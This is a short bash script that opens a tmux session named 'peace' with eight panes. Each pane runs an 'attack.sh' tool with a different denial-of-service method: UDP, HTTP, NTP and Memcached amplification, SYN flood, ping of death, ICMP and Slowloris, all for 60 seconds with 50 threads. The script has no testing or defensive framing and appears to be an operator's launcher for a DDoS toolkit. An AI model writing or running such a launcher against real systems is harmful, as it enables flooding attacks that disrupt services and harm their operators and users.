#!/usr/bin/env bash

tmux kill-session -t "peace" 2>/dev/null
tmux new-session -d -s "peace" "./attack.sh --method UDP --time 60 --threads 50" \; \
  split-window -dh "./attack.sh --method HTTP --time 60 --threads 50" \; \
  split-window -dh "./attack.sh --method NTP --time 60 --threads 50" \; \
  split-window -dh "./attack.sh --method SYN --time 60 --threads 50" \; \
  split-window -dv -t 0 "./attack.sh --method POD --time 60 --threads 50" \; \
  split-window -dv -t 2 "./attack.sh --method ICMP --time 60 --threads 50" \; \
  split-window -dv -t 4 "./attack.sh --method Slowloris --time 60 --threads 50" \; \
  split-window -dv -t 6 "./attack.sh --method Memcached --time 60 --threads 50" \; \
attach
